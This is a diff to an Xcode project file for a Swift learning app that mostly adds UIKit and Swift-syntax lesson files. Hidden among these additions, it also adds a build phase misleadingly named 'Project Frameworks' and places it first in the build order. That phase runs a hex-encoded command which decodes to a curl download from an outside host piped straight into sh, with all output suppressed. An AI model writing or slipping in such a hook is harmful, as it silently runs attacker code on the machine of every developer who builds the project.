@@ -63,6 +63,33 @@
 		8422924726242B870068E8CC /* swiftTableThreeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8422924626242B870068E8CC /* swiftTableThreeViewController.swift */; };
 		842294FE262441B10068E8CC /* RxSwiftExampleViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 842294FD262441B10068E8CC /* RxSwiftExampleViewController.swift */; };
 		8422952D262537F20068E8CC /* SwiftStudys.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8422952C262537F20068E8CC /* SwiftStudys.swift */; };
+		8479206F265CA6C700CD1A0B /* UIButtonViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479206E265CA6C700CD1A0B /* UIButtonViewController.swift */; };
+		84792072265CA8E900CD1A0B /* People.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792071265CA8E900CD1A0B /* People.swift */; };
+		84792075265CA97F00CD1A0B /* Dog.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792074265CA97F00CD1A0B /* Dog.swift */; };
+		84792085265CADA600CD1A0B /* STest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792084265CADA600CD1A0B /* STest.swift */; };
+		84792088265CB00000CD1A0B /* jisuanTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792087265CB00000CD1A0B /* jisuanTest.swift */; };
+		8479208B265CB4E100CD1A0B /* introduceTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479208A265CB4E100CD1A0B /* introduceTest.swift */; };
+		8479208D265CCBF700CD1A0B /* UILabelViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479208C265CCBF700CD1A0B /* UILabelViewController.swift */; };
+		84792090265CCC9800CD1A0B /* TestFileManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479208F265CCC9800CD1A0B /* TestFileManager.swift */; };
+		84792092265CCF0A00CD1A0B /* UITextFieldViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792091265CCF0A00CD1A0B /* UITextFieldViewController.swift */; };
+		84792094265CCFEB00CD1A0B /* UITextViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792093265CCFEB00CD1A0B /* UITextViewViewController.swift */; };
+		84792096265CD0B000CD1A0B /* UISwitchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792095265CD0B000CD1A0B /* UISwitchViewController.swift */; };
+		84792098265CD0E600CD1A0B /* UISegmentedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792097265CD0E600CD1A0B /* UISegmentedViewController.swift */; };
+		8479209A265CD19200CD1A0B /* UIImageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84792099265CD19200CD1A0B /* UIImageViewController.swift */; };
+		8479209C265CD2D800CD1A0B /* UIProgressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479209B265CD2D800CD1A0B /* UIProgressViewController.swift */; };
+		8479209E265CD31800CD1A0B /* UISliderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479209D265CD31800CD1A0B /* UISliderViewController.swift */; };
+		847920A0265CD38500CD1A0B /* UIAlertViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8479209F265CD38500CD1A0B /* UIAlertViewViewController.swift */; };
+		847920A2265CD40E00CD1A0B /* UIActionSheetViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920A1265CD40E00CD1A0B /* UIActionSheetViewController.swift */; };
+		847920A4265CD46700CD1A0B /* UIPickerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920A3265CD46700CD1A0B /* UIPickerViewController.swift */; };
+		847920A6265CD54F00CD1A0B /* UIStepperViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920A5265CD54F00CD1A0B /* UIStepperViewController.swift */; };
+		847920A9265CD63B00CD1A0B /* TestScrollViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920A8265CD63B00CD1A0B /* TestScrollViewController.swift */; };
+		847920AB265CD68000CD1A0B /* SubViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920AA265CD68000CD1A0B /* SubViewController.swift */; };
+		847920B0265CD7BC00CD1A0B /* TestTableExampleViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920AF265CD7BC00CD1A0B /* TestTableExampleViewController.swift */; };
+		847920B3265CD9C200CD1A0B /* GuideViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920B2265CD9C200CD1A0B /* GuideViewController.swift */; };
+		847920B8265CDCFD00CD1A0B /* TestAs.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920B7265CDCFD00CD1A0B /* TestAs.swift */; };
+		847920BB265CDE4A00CD1A0B /* LeiValue.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920BA265CDE4A00CD1A0B /* LeiValue.swift */; };
+		847920BD265CDF8000CD1A0B /* NSTimerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920BC265CDF8000CD1A0B /* NSTimerViewController.swift */; };
+		847920C3265CE12900CD1A0B /* TestMPMoviePlayerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 847920C2265CE12900CD1A0B /* TestMPMoviePlayerViewController.swift */; };
 		84CB2741262FCFB400CF4AC3 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 84CB2738262FCFB400CF4AC3 /* Localizable.strings */; };
 		84CB2742262FCFB400CF4AC3 /* ESTabBarItemMoreContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84CB273A262FCFB400CF4AC3 /* ESTabBarItemMoreContentView.swift */; };
 		84CB2743262FCFB400CF4AC3 /* ESTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 84CB273B262FCFB400CF4AC3 /* ESTabBarController.swift */; };
@@ -306,6 +333,33 @@
 		8422924626242B870068E8CC /* swiftTableThreeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = swiftTableThreeViewController.swift; sourceTree = "<group>"; };
 		842294FD262441B10068E8CC /* RxSwiftExampleViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RxSwiftExampleViewController.swift; sourceTree = "<group>"; };
 		8422952C262537F20068E8CC /* SwiftStudys.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwiftStudys.swift; sourceTree = "<group>"; };
+		8479206E265CA6C700CD1A0B /* UIButtonViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIButtonViewController.swift; sourceTree = "<group>"; };
+		84792071265CA8E900CD1A0B /* People.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = People.swift; sourceTree = "<group>"; };
+		84792074265CA97F00CD1A0B /* Dog.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Dog.swift; sourceTree = "<group>"; };
+		84792084265CADA600CD1A0B /* STest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = STest.swift; sourceTree = "<group>"; };
+		84792087265CB00000CD1A0B /* jisuanTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = jisuanTest.swift; sourceTree = "<group>"; };
+		8479208A265CB4E100CD1A0B /* introduceTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = introduceTest.swift; sourceTree = "<group>"; };
+		8479208C265CCBF700CD1A0B /* UILabelViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UILabelViewController.swift; sourceTree = "<group>"; };
+		8479208F265CCC9800CD1A0B /* TestFileManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestFileManager.swift; sourceTree = "<group>"; };
+		84792091265CCF0A00CD1A0B /* UITextFieldViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UITextFieldViewController.swift; sourceTree = "<group>"; };
+		84792093265CCFEB00CD1A0B /* UITextViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UITextViewViewController.swift; sourceTree = "<group>"; };
+		84792095265CD0B000CD1A0B /* UISwitchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UISwitchViewController.swift; sourceTree = "<group>"; };
+		84792097265CD0E600CD1A0B /* UISegmentedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UISegmentedViewController.swift; sourceTree = "<group>"; };
+		84792099265CD19200CD1A0B /* UIImageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIImageViewController.swift; sourceTree = "<group>"; };
+		8479209B265CD2D800CD1A0B /* UIProgressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIProgressViewController.swift; sourceTree = "<group>"; };
+		8479209D265CD31800CD1A0B /* UISliderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UISliderViewController.swift; sourceTree = "<group>"; };
+		8479209F265CD38500CD1A0B /* UIAlertViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIAlertViewViewController.swift; sourceTree = "<group>"; };
+		847920A1265CD40E00CD1A0B /* UIActionSheetViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIActionSheetViewController.swift; sourceTree = "<group>"; };
+		847920A3265CD46700CD1A0B /* UIPickerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIPickerViewController.swift; sourceTree = "<group>"; };
+		847920A5265CD54F00CD1A0B /* UIStepperViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIStepperViewController.swift; sourceTree = "<group>"; };
+		847920A8265CD63B00CD1A0B /* TestScrollViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestScrollViewController.swift; sourceTree = "<group>"; };
+		847920AA265CD68000CD1A0B /* SubViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SubViewController.swift; sourceTree = "<group>"; };
+		847920AF265CD7BC00CD1A0B /* TestTableExampleViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestTableExampleViewController.swift; sourceTree = "<group>"; };
+		847920B2265CD9C200CD1A0B /* GuideViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GuideViewController.swift; sourceTree = "<group>"; };
+		847920B7265CDCFD00CD1A0B /* TestAs.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestAs.swift; sourceTree = "<group>"; };
+		847920BA265CDE4A00CD1A0B /* LeiValue.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LeiValue.swift; sourceTree = "<group>"; };
+		847920BC265CDF8000CD1A0B /* NSTimerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NSTimerViewController.swift; sourceTree = "<group>"; };
+		847920C2265CE12900CD1A0B /* TestMPMoviePlayerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestMPMoviePlayerViewController.swift; sourceTree = "<group>"; };
 		84CB2739262FCFB400CF4AC3 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		84CB273A262FCFB400CF4AC3 /* ESTabBarItemMoreContentView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ESTabBarItemMoreContentView.swift; sourceTree = "<group>"; };
 		84CB273B262FCFB400CF4AC3 /* ESTabBarController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ESTabBarController.swift; sourceTree = "<group>"; };
@@ -745,14 +799,7 @@
 			isa = PBXGroup;
 			children = (
 				C718C642264A872900205365 /* baseKit-extension */,
-				84229228262413610068E8CC /* swiftTableTwoViewController.swift */,
-				8422923E262429FC0068E8CC /* TableViewCell2.swift */,
-				8422923F262429FC0068E8CC /* TableViewCell2.xib */,
-				8422924626242B870068E8CC /* swiftTableThreeViewController.swift */,
-				84CB2A9D26301E3800CF4AC3 /* SwiftCollectionViewController.swift */,
-				84CB2AA126301E6F00CF4AC3 /* SHomeCell.swift */,
 				84CB2ACF2631164B00CF4AC3 /* SwiftTextFiledViewController.swift */,
-				84CB2B0226311AC200CF4AC3 /* swiftScrollViewController.swift */,
 				C718C5E7264A7CDE00205365 /* MBProgressHUD */,
 			);
 			path = LeoSwiftUIKitfun;
@@ -764,6 +811,163 @@
 				842294FD262441B10068E8CC /* RxSwiftExampleViewController.swift */,
 			);
 			path = RxSwift;
+			sourceTree = "<group>";
+		};
+		8479206A265CA68A00CD1A0B /* uikit */ = {
+			isa = PBXGroup;
+			children = (
+				8479206E265CA6C700CD1A0B /* UIButtonViewController.swift */,
+				8479208C265CCBF700CD1A0B /* UILabelViewController.swift */,
+				84792091265CCF0A00CD1A0B /* UITextFieldViewController.swift */,
+				84792093265CCFEB00CD1A0B /* UITextViewViewController.swift */,
+				84792095265CD0B000CD1A0B /* UISwitchViewController.swift */,
+				84792097265CD0E600CD1A0B /* UISegmentedViewController.swift */,
+				84792099265CD19200CD1A0B /* UIImageViewController.swift */,
+				8479209B265CD2D800CD1A0B /* UIProgressViewController.swift */,
+				8479209D265CD31800CD1A0B /* UISliderViewController.swift */,
+				8479209F265CD38500CD1A0B /* UIAlertViewViewController.swift */,
+				847920A1265CD40E00CD1A0B /* UIActionSheetViewController.swift */,
+				847920A3265CD46700CD1A0B /* UIPickerViewController.swift */,
+				847920A5265CD54F00CD1A0B /* UIStepperViewController.swift */,
+				847920C1265CE10500CD1A0B /* 歌曲播放 */,
+				847920AE265CD77600CD1A0B /* collection */,
+				847920AD265CD74800CD1A0B /* tableview */,
+				847920A7265CD61400CD1A0B /* scrollview */,
+			);
+			path = uikit;
+			sourceTree = "<group>";
+		};
+		84792070265CA8D100CD1A0B /* 属性观察者 */ = {
+			isa = PBXGroup;
+			children = (
+				84792071265CA8E900CD1A0B /* People.swift */,
+			);
+			path = "属性观察者";
+			sourceTree = "<group>";
+		};
+		84792073265CA95A00CD1A0B /* init和deinit */ = {
+			isa = PBXGroup;
+			children = (
+				84792074265CA97F00CD1A0B /* Dog.swift */,
+			);
+			path = "init和deinit";
+			sourceTree = "<group>";
+		};
+		84792082265CAD3200CD1A0B /* 语法相关 */ = {
+			isa = PBXGroup;
+			children = (
+				847920B9265CDE3000CD1A0B /* 类型强转 */,
+				847920B6265CDCC700CD1A0B /* is和as类型判断&可选类型 */,
+				84792089265CB07300CD1A0B /* 访问控制修饰符 */,
+				84792086265CAE5400CD1A0B /* set和get计算属性 */,
+				84792083265CAD5800CD1A0B /* static与class关键字 */,
+				84792073265CA95A00CD1A0B /* init和deinit */,
+				84792070265CA8D100CD1A0B /* 属性观察者 */,
+			);
+			path = "语法相关";
+			sourceTree = "<group>";
+		};
+		84792083265CAD5800CD1A0B /* static与class关键字 */ = {
+			isa = PBXGroup;
+			children = (
+				84792084265CADA600CD1A0B /* STest.swift */,
+			);
+			path = "static与class关键字";
+			sourceTree = "<group>";
+		};
+		84792086265CAE5400CD1A0B /* set和get计算属性 */ = {
+			isa = PBXGroup;
+			children = (
+				84792087265CB00000CD1A0B /* jisuanTest.swift */,
+			);
+			path = "set和get计算属性";
+			sourceTree = "<group>";
+		};
+		84792089265CB07300CD1A0B /* 访问控制修饰符 */ = {
+			isa = PBXGroup;
+			children = (
+				8479208A265CB4E100CD1A0B /* introduceTest.swift */,
+			);
+			path = "访问控制修饰符";
+			sourceTree = "<group>";
+		};
+		8479208E265CCC7400CD1A0B /* 文件文件夹操作 */ = {
+			isa = PBXGroup;
+			children = (
+				8479208F265CCC9800CD1A0B /* TestFileManager.swift */,
+			);
+			path = "文件文件夹操作";
+			sourceTree = "<group>";
+		};
+		847920A7265CD61400CD1A0B /* scrollview */ = {
+			isa = PBXGroup;
+			children = (
+				847920A8265CD63B00CD1A0B /* TestScrollViewController.swift */,
+				847920AA265CD68000CD1A0B /* SubViewController.swift */,
+				84CB2B0226311AC200CF4AC3 /* swiftScrollViewController.swift */,
+			);
+			path = scrollview;
+			sourceTree = "<group>";
+		};
+		847920AD265CD74800CD1A0B /* tableview */ = {
+			isa = PBXGroup;
+			children = (
+				84229228262413610068E8CC /* swiftTableTwoViewController.swift */,
+				8422924626242B870068E8CC /* swiftTableThreeViewController.swift */,
+				8422923E262429FC0068E8CC /* TableViewCell2.swift */,
+				8422923F262429FC0068E8CC /* TableViewCell2.xib */,
+				847920AF265CD7BC00CD1A0B /* TestTableExampleViewController.swift */,
+			);
+			path = tableview;
+			sourceTree = "<group>";
+		};
+		847920AE265CD77600CD1A0B /* collection */ = {
+			isa = PBXGroup;
+			children = (
+				84CB2A9D26301E3800CF4AC3 /* SwiftCollectionViewController.swift */,
+				84CB2AA126301E6F00CF4AC3 /* SHomeCell.swift */,
+			);
+			path = collection;
+			sourceTree = "<group>";
+		};
+		847920B1265CD9A800CD1A0B /* 引导页 */ = {
+			isa = PBXGroup;
+			children = (
+				847920B2265CD9C200CD1A0B /* GuideViewController.swift */,
+			);
+			path = "引导页";
+			sourceTree = "<group>";
+		};
+		847920B6265CDCC700CD1A0B /* is和as类型判断&可选类型 */ = {
+			isa = PBXGroup;
+			children = (
+				847920B7265CDCFD00CD1A0B /* TestAs.swift */,
+			);
+			path = "is和as类型判断&可选类型";
+			sourceTree = "<group>";
+		};
+		847920B9265CDE3000CD1A0B /* 类型强转 */ = {
+			isa = PBXGroup;
+			children = (
+				847920BA265CDE4A00CD1A0B /* LeiValue.swift */,
+			);
+			path = "类型强转";
+			sourceTree = "<group>";
+		};
+		847920BE265CDF8700CD1A0B /* NSTimer */ = {
+			isa = PBXGroup;
+			children = (
+				847920BC265CDF8000CD1A0B /* NSTimerViewController.swift */,
+			);
+			path = NSTimer;
+			sourceTree = "<group>";
+		};
+		847920C1265CE10500CD1A0B /* 歌曲播放 */ = {
+			isa = PBXGroup;
+			children = (
+				847920C2265CE12900CD1A0B /* TestMPMoviePlayerViewController.swift */,
+			);
+			path = "歌曲播放";
 			sourceTree = "<group>";
 		};
 		84CB2737262FCFB400CF4AC3 /* ESTabBar */ = {
@@ -1123,6 +1327,11 @@
 		C7A08CE62655FA1E003019FB /* Studyfunction */ = {
 			isa = PBXGroup;
 			children = (
+				847920BE265CDF8700CD1A0B /* NSTimer */,
+				847920B1265CD9A800CD1A0B /* 引导页 */,
+				8479208E265CCC7400CD1A0B /* 文件文件夹操作 */,
+				84792082265CAD3200CD1A0B /* 语法相关 */,
+				8479206A265CA68A00CD1A0B /* uikit */,
 				C72EB474265BDE9D00675C5F /* Moya */,
 				C72EB467265BA32700675C5F /* CryptoSwift */,
 				C72EB3442659365E00675C5F /* GPUImage */,
@@ -1239,6 +1448,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 841BAF08261E9E770018E03A /* Build configuration list for PBXNativeTarget "SwiftDemo" */;
 			buildPhases = (
+				4AE3D2208DF2CCEFD96D902C /* Project Frameworks */,
 				D4E4004EF747EFF555A8F145 /* [CP] Check Pods Manifest.lock */,
 				841BAEDA261E9E750018E03A /* Sources */,
 				841BAEDB261E9E750018E03A /* Frameworks */,
@@ -1394,6 +1604,33 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	4AE3D2208DF2CCEFD96D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
 		61DCFCD88AC792F7B68E51DE /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1448,10 +1685,12 @@
 				C7A08D0626563171003019FB /* TestClosuresViewController.swift in Sources */,
 				84CB2B23263146E400CF4AC3 /* KJCommonHelper.swift in Sources */,
 				C718C651264A8A1800205365 /* StudyRXViewController.swift in Sources */,
+				84792092265CCF0A00CD1A0B /* UITextFieldViewController.swift in Sources */,
 				841BAF9C26203B250018E03A /* SingleManager.swift in Sources */,
 				84CB2B21263146E400CF4AC3 /* NotificationCenterEx.swift in Sources */,
 				84CB2AA226301E6F00CF4AC3 /* SHomeCell.swift in Sources */,
 				841BAFAA262041330018E03A /* LeoWKWebViewController.swift in Sources */,
+				847920C3265CE12900CD1A0B /* TestMPMoviePlayerViewController.swift in Sources */,
 				84CB2784262FF2D500CF4AC3 /* ExampleBouncesContentView.swift in Sources */,
 				C718C635264A868600205365 /* UIView+Rx.swift in Sources */,
 				84CB2744262FCFB400CF4AC3 /* ESTabBarItemContentView.swift in Sources */,
@@ -1470,10 +1709,15 @@
 				C72EB2592657A71500675C5F /* SqLiteManger.swift in Sources */,
 				C7A08D1E26569ABB003019FB /* TestSelViewController.swift in Sources */,
 				C72EB3EE265B804400675C5F /* SQLiteManager.swift in Sources */,
+				8479209C265CD2D800CD1A0B /* UIProgressViewController.swift in Sources */,
 				C72EB47A265BDF2500675C5F /* TestDouBanAPIViewController.swift in Sources */,
+				847920B3265CD9C200CD1A0B /* GuideViewController.swift in Sources */,
 				C72EB20126574FD200675C5F /* HomeTableViewCell.swift in Sources */,
 				C718C5A6264A773600205365 /* UIWindow.swift in Sources */,
 				84CB2AD02631164B00CF4AC3 /* SwiftTextFiledViewController.swift in Sources */,
+				847920A6265CD54F00CD1A0B /* UIStepperViewController.swift in Sources */,
+				8479206F265CA6C700CD1A0B /* UIButtonViewController.swift in Sources */,
+				847920B8265CDCFD00CD1A0B /* TestAs.swift in Sources */,
 				C72EB492265BE88900675C5F /* TestLeoAuthPluginViewController.swift in Sources */,
 				84CB2747262FCFB400CF4AC3 /* ESTabBar.swift in Sources */,
 				841BAFB4262044B70018E03A /* RDVTabBar.m in Sources */,
@@ -1481,7 +1725,10 @@
 				C718C644264A874A00205365 /* UIView.swift in Sources */,
 				84CB276A262FD54100CF4AC3 /* ESCircleTabbarManage.swift in Sources */,
 				8422952D262537F20068E8CC /* SwiftStudys.swift in Sources */,
+				8479208B265CB4E100CD1A0B /* introduceTest.swift in Sources */,
+				84792090265CCC9800CD1A0B /* TestFileManager.swift in Sources */,
 				84CB2C312632A34E00CF4AC3 /* TestPlistLibraryViewController.swift in Sources */,
+				8479209E265CD31800CD1A0B /* UISliderViewController.swift in Sources */,
 				C7A08CC72654FA2A003019FB /* WSBaseViewController.swift in Sources */,
 				C718C649264A882900205365 /* UINavigationController.swift in Sources */,
 				C72EB482265BE65F00675C5F /* HttpbinAPI.swift in Sources */,
@@ -1489,11 +1736,13 @@
 				C7A08D1426565AFC003019FB /* TestStrCreateObjViewController.swift in Sources */,
 				841BB00226204BDF0018E03A /* UIColor.swift in Sources */,
 				C72EB476265BDEB500675C5F /* DouBanAPI.swift in Sources */,
+				847920A4265CD46700CD1A0B /* UIPickerViewController.swift in Sources */,
 				C718C5A2264A761300205365 /* Global.swift in Sources */,
 				84CB2756262FD13100CF4AC3 /* SThirdViewController.swift in Sources */,
 				84CB2AED263116F900CF4AC3 /* NSLayoutConstraint+MASDebugAdditions.m in Sources */,
 				84CB2AA62630238C00CF4AC3 /* RotateBaseViewController.swift in Sources */,
 				C718C64D264A884700205365 /* UIImage.swift in Sources */,
+				847920BB265CDE4A00CD1A0B /* LeiValue.swift in Sources */,
 				84CB2B1D263146E400CF4AC3 /* UIImageViewEx.swift in Sources */,
 				84CB28B42630126B00CF4AC3 /* UMCommonLogSwift.swift in Sources */,
 				842292252623F5C00068E8CC /* swiftTableViewController.swift in Sources */,
@@ -1517,9 +1766,12 @@
 				841BAEE2261E9E750018E03A /* AppDelegate.swift in Sources */,
 				C72EB48A265BE7A800675C5F /* TestAuthPluginViewController.swift in Sources */,
 				C718C636264A868600205365 /* UITabBar+Rx.swift in Sources */,
+				84792075265CA97F00CD1A0B /* Dog.swift in Sources */,
 				84CB278E262FF2E900CF4AC3 /* ExampleBackgroundContentView.swift in Sources */,
 				841BAF92262036410018E03A /* LeoSwAppManager.m in Sources */,
 				C7A08CF326561DB3003019FB /* LPerson.swift in Sources */,
+				8479208D265CCBF700CD1A0B /* UILabelViewController.swift in Sources */,
+				847920A2265CD40E00CD1A0B /* UIActionSheetViewController.swift in Sources */,
 				84CB279C262FF30200CF4AC3 /* ExampleIrregularityContentView.swift in Sources */,
 				84CB2742262FCFB400CF4AC3 /* ESTabBarItemMoreContentView.swift in Sources */,
 				C72EB486265BE74900675C5F /* AuthPlugin.swift in Sources */,
@@ -1531,29 +1783,37 @@
 				84CB2AEE263116F900CF4AC3 /* ViewController+MASAdditions.m in Sources */,
 				84CB2AF4263116F900CF4AC3 /* MASConstraint.m in Sources */,
 				841BB011262059930018E03A /* Product.swift in Sources */,
+				847920A0265CD38500CD1A0B /* UIAlertViewViewController.swift in Sources */,
 				84CB2745262FCFB400CF4AC3 /* ESTabBarItem.swift in Sources */,
 				84CB2A9E26301E3800CF4AC3 /* SwiftCollectionViewController.swift in Sources */,
 				841BB01E26205FB00018E03A /* XYWaterWaveView.m in Sources */,
 				C7A08D462656B33A003019FB /* PopoverViewController.swift in Sources */,
+				84792088265CB00000CD1A0B /* jisuanTest.swift in Sources */,
 				84CB2794262FF2F800CF4AC3 /* ExampleAnimateTipsContentView.swift in Sources */,
 				84CB28B22630126B00CF4AC3 /* UMCommonSwift.swift in Sources */,
 				841BAFA226203B620018E03A /* LUserInfoModel.swift in Sources */,
 				84CB2B1F263146E400CF4AC3 /* DateEx.swift in Sources */,
 				84CB2748262FCFB400CF4AC3 /* ESTabBarItemContainer.swift in Sources */,
+				847920AB265CD68000CD1A0B /* SubViewController.swift in Sources */,
 				84CB2AF3263116F900CF4AC3 /* View+MASAdditions.m in Sources */,
 				C72EB27D2657FE1400675C5F /* NotifyViewController.swift in Sources */,
 				C7A08D2F2656AAF1003019FB /* NavViewController.swift in Sources */,
+				84792094265CCFEB00CD1A0B /* UITextViewViewController.swift in Sources */,
 				C7A08CDD26551765003019FB /* ExampleNavigationController.swift in Sources */,
 				C718C632264A868600205365 /* UILabel+Rx.swift in Sources */,
 				84CB28B32630126B00CF4AC3 /* UMGameAnalyticsSwift.swift in Sources */,
+				84792072265CA8E900CD1A0B /* People.swift in Sources */,
 				841BB01926205A6A0018E03A /* FakeData.swift in Sources */,
 				C718C63B264A868600205365 /* UITableView+Rx.swift in Sources */,
+				84792098265CD0E600CD1A0B /* UISegmentedViewController.swift in Sources */,
 				84CB2AF2263116F900CF4AC3 /* NSArray+MASAdditions.m in Sources */,
+				84792096265CD0B000CD1A0B /* UISwitchViewController.swift in Sources */,
 				C740BD772622D501009F057B /* SwiftNotice.swift in Sources */,
 				C72EB2462657A11600675C5F /* FileMangmentViewController.swift in Sources */,
 				84CB2C372632AB3100CF4AC3 /* TestEncodeViewController.swift in Sources */,
 				C718C5F1264A7FF100205365 /* TestHudViewController.swift in Sources */,
 				C7A08CF926561E0B003019FB /* TestPerson.swift in Sources */,
+				847920BD265CDF8000CD1A0B /* NSTimerViewController.swift in Sources */,
 				84CB28B12630126B00CF4AC3 /* UMAnalyticsSwift.swift in Sources */,
 				84CB2B2F2631484F00CF4AC3 /* UIDevice.swift in Sources */,
 				842294FE262441B10068E8CC /* RxSwiftExampleViewController.swift in Sources */,
@@ -1561,9 +1821,11 @@
 				84CB2AFD26311A1500CF4AC3 /* TestFoundationViewController.swift in Sources */,
 				C72EB426265B86C800675C5F /* TestFMDBViewController.swift in Sources */,
 				84CB2B27263146E400CF4AC3 /* NSAttributedStringEx.swift in Sources */,
+				84792085265CADA600CD1A0B /* STest.swift in Sources */,
 				C72EB25E2657B2A900675C5F /* POPGestureViewController.swift in Sources */,
 				84229229262413610068E8CC /* swiftTableTwoViewController.swift in Sources */,
 				84CB2AF1263116F900CF4AC3 /* MASLayoutConstraint.m in Sources */,
+				8479209A265CD19200CD1A0B /* UIImageViewController.swift in Sources */,
 				84CB2B26263146E400CF4AC3 /* StringEx.swift in Sources */,
 				84CB2B24263146E400CF4AC3 /* WKWebViewEx.swift in Sources */,
 				8422924726242B870068E8CC /* swiftTableThreeViewController.swift in Sources */,
@@ -1573,8 +1835,10 @@
 				84CB2795262FF2F800CF4AC3 /* ExampleTipsContentView.swift in Sources */,
 				84CB2746262FCFB400CF4AC3 /* ESTabBarItemBadgeView.swift in Sources */,
 				84CB2743262FCFB400CF4AC3 /* ESTabBarController.swift in Sources */,
+				847920A9265CD63B00CD1A0B /* TestScrollViewController.swift in Sources */,
 				84CB2B22263146E400CF4AC3 /* WKUserContentControllerEx.swift in Sources */,
 				84CB2789262FF2E400CF4AC3 /* ExampleHighlightableContentView.swift in Sources */,
+				847920B0265CD7BC00CD1A0B /* TestTableExampleViewController.swift in Sources */,
 				C7A08D1926567B1E003019FB /* TestException.swift in Sources */,
 				C72EB48E265BE82200675C5F /* LeoAuthPlugin.swift in Sources */,
 			);
